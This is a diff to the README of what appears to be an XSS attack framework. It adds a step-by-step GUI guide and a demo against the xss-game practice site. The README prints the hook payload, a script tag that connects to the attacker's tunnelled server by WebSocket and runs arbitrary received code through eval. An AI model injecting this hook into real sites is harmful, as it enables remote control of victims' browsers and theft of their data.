@@ -18,6 +18,50 @@ for this because the application will take care of tunneling the connection betw
 > Use `--help` argument to get help.
 ![commandline help](docs/help.png)
 
+### GUI-Guide
+
+Firstly, choose the hook. [Default hook](hooks/default) is the simplest hook, it is only suitable for forms without XSS
+protection:
+
+![step 1](docs/step_1.png)
+
+Then, choose the payload. [Hello world payload](payloads/hello_world) is an example payload, it just alerts "Hello,
+World!":
+
+![step 2](docs/step_2.png)
+
+Now, lets set up tunneling. Tunneling is needed to make a local server public. You have 2 options:
+
+1) use one of the suggested tunneling apps (now it's only [ngrok](https://ngrok.com/))
+2) tunnel ports yourself and pass the public URL of the HTTP tunnel to the program
+
+![step 3](docs/step_3_1.png)
+
+![step 3](docs/step_3_2.png)
+
+Finally, you can run the process!
+
+![step 4](docs/step_4.png)
+
+Now you can copy the hook and start hunting ;D
+
+![step 5](docs/step_5.png)
+
+To demonstrate the possibilities, we can use site [xss-game.appspot.com](https://xss-game.appspot.com/).
+Enter the hook into search form:
+
+![step 6](docs/step_6.png)
+
+Press "Search". As you can see, we have the alert dialog!
+
+![step 7](docs/step_7.png)
+
+Also, we have "Hello, World!" in our console:
+![step 8](docs/step_8.png)
+
+
+
+
 ### Hook
 
 > _Hooks folder: [hooks](hooks)_
@@ -26,8 +70,7 @@ for this because the application will take care of tunneling the connection betw
 
 ```html
 
-<script>c = new WebSocket('{{environment.public_url}}');
-c.onmessage = (e) => eval(e.data);</script>
+<script>c = new WebSocket('{{environment.public_url}}');c.onmessage = (e) => eval(e.data);</script>
 ```
 
 **NOTE:** _As you can see here is a built-in variable: {{environment.public_url}}. You can read more about
@@ -117,8 +160,6 @@ browser and in the graphical interface._
 ### Graphical
 
 ![GUI](docs/GUI.png)
-
-![img.png](docs/GUI_2.png)
 
 ### WEB
 
